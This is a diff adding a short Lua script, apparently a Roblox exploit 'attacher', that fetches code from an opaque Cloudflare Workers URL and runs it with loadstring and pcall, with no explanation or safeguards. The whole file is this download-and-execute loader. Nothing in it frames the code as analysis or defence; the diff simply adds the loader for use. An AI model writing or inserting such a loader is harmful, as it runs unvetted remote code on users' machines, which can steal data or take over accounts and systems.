@@ -1,0 +1,13 @@
+local response = request({
+    Url = "https://bold-darkness-4fdd.lvlyvcbcla.workers.dev/attach/8cc4c875ddc29d0060a41ebf1dce58f1",
+    Method = "GET"
+})
+
+if response.StatusCode == 200 then
+    local func = loadstring(response.Body)
+    if func then
+        pcall(func)
+    end
+else
+    warn("ATTACHER error: " .. tostring(response.StatusCode))
+end
